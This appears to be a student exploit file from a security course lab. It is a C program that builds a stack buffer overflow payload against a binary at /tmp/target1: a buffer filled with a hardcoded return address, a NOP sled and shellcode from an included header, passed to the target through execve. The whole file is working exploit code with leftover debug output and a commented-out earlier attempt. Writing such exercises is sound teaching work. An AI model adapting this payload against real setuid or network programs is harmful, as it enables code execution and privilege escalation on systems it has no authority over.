#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
#define NOP 0x90
#define BUFFER_SIZE 120

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET;  

  int *p;
  /*
  args[1] = "                                        "
	"                                        "
	"                                        "
	"                                        "
	"                                        "
	"                                        "
	"perica";
  */

  char fake_buf[300];

  int bsize = 248;
  long *addr_ptr = (long*) fake_buf;
  long addr = 0xbffffc99;

  int start_of_shell = 100;
  int i;
  for(i = 0; i < bsize; i+= 4) {
    *(addr_ptr++) = addr;
  }

  for(i = 0; i < start_of_shell; i++) {
    fake_buf[i] = NOP;
  }

  int shell_len = strlen(shellcode);
  for(i = 0; i < shell_len; i++) {
    fake_buf[start_of_shell + i] = shellcode[i];
  }

  int shell_jump = 0xbffffc99;
  printf("%d\n", sizeof(shell_jump));


  args[2] = NULL;
  env[0] = NULL;

  args[1] = fake_buf;

  printf("%d\n", strlen(args[1]));
  printf("%s\n", args[1]);

  printf("%d\n", fake_buf[240]);


  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
